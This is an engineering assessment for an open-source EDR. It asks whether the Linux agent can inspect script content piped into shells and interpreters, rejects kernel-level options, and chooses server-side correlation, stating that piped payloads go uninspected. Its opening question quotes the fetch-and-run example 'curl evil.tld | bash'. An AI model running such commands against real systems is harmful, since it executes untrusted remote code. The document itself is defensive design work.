# Linux Script-Scanning Limit — Assessment (Y2.8)

**Date:** 2026-10-06 · **Author:** Yadian Llada
**Issue:** utmstack/OpenEDR#73

## Question

Can the EDR on Linux inspect script content piped into an interpreter
(`curl evil.tld | bash`, `echo code | python3`) before it executes?

## What we already do on Linux

| Layer | What it covers |
|---|---|
| Y2.2 permission mode | Blocks **execution of a file** judged malicious. Covers a dropped script run as a program (`./evil.sh`). Does NOT cover content piped to an already-running interpreter. |
| Y2.7 behavioral telemetry | Every execve produces `process_create`; if the image is a shell/interpreter, `shell_activity` also fires with the full cmdline. Catches the **invocation** (`bash -c 'curl …'`), not the **piped payload**. |

## Options evaluated

| Option | Cost | Verdict |
|---|---|---|
| LD_PRELOAD hook on interpreter `read()` | Inject a `.so` into every interpreter binary. Fragile: new interpreters, setuid, stripped binaries all bypass. High maintenance. | **Reject** |
| Seccomp-bpf notification (EDR as parent) | Only works for processes the EDR itself launches. Useless for user shells. | **Reject** |
| eBPF tracepoint on `read()`/`write()` filtered by PID | BPF program + cilium/ebpf dependency + byte-stream correlation logic + perf impact on filtered PIDs. Kernel version dependency. High cost for the small detection gain. | **Reject** |
| fanotify on pipe file descriptors | Not possible: pipes are kernel-internal objects, not on-disk files. fanotify cannot observe them. | **Impossible** |
| Permission-mode extension: block `bash`/`sh` when stdin is a pipe | Breaks legitimate pipe usage system-wide. False positive rate unacceptable. | **Reject** |
| **Server-side correlation on existing Y2.7 events** | Zero new code. `process_create(curl)` + `process_create(bash)` + `shell_activity` within a short window flags the pattern. Detection, not prevention. | **Accept** |

## Decision

We will **not** build a Linux equivalent of the Windows pre-execution script
block for piped interpreter input. The cost of every kernel-level option
(LD_PRELOAD fragility, seccomp scope, eBPF complexity, fanotify impossibility)
outweighs the detection gain we would get, because Y2.7 already surfaces the
invocation pattern to the server for correlation.

The one sentence this section adds to the product documentation:

> **On Linux, UTMStack EDR blocks execution of files judged malicious and
> detects suspicious interpreter activity. It does not inspect the content
> of data piped into a shell or interpreter.**

## Prototype evidence

No new code required. Verified on kernel 7.0.0-34-generic, 2026-10-06:

- `bash -c 'echo test1'` (Y2.7 run): `process_create` + `shell_activity`
  with the full cmdline in the signature — invocation-level content is
  visible.
- `echo 'echo payload1' | bash` (Y2.8 run): `process_create(bash)` and
  `shell_activity` with signature exactly `"bash"` — no args, because
  stdin is the pipe. The payload is NOT in the signature. The invocation
  is visible; the content is not.

A server-side correlation rule on `process_create(bash)` + the pipe source
(visible in the sibling events) is the detection path. Prevention of the
payload requires one of the rejected kernel-level options above.

This is the detection path. The prevention gap (content never inspected
before execution) is the stated limit above.
